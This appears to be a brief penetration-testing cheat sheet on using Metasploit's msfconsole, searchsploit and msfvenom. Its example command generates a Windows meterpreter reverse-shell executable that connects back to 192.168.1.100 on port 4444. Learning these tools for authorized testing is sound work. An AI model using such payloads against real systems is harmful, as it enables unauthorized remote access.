# Basic usage
- Run the command `msfconsole` to open Metasploit.
- Use `search <vulnerability>` to find different exploits.
- Choose the one you want to use with `use <number>`.
- Use `show options` to select the payload.
- Choose the payload with `set payload <number>`.
- Set the necessary parameters seen with `show options` using `set <parameter> <value>`. Only the ones marked with **yes*** are mandatory.
- To execute, use `run`.
# searchsploit
**SearchSploit** is used to search and locate known exploits and vulnerabilities in a wide variety of software and systems. It utilizes the Exploit Database, which contains an extensive collection of exploits, shellcodes, and security-related references.
```bash
searchsploit <whatever>
```

Once we find the exploit that we need we can know the path where it's stored with the command:
```bash
searchsploit -p<exploit_number>
```
# msfvenom
**msfvenom** is primarily used for generating payloads, which are pieces of code that can be delivered to a target system to exploit vulnerabilities or gain unauthorized access.

```bash
#target_info = java, php, python, windows, ubuntu, etc
msfvenom -l payloads | grep <target_info>
msfvenom -p PAYLOAD [OPTIONS] -f FORMAT [OTHER_OPTIONS]
```
- Example:
```bash
#-f = file extension
#-o = file name
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
#if you want to know the payload options use:
msfvenom -p <payload> --list-options
```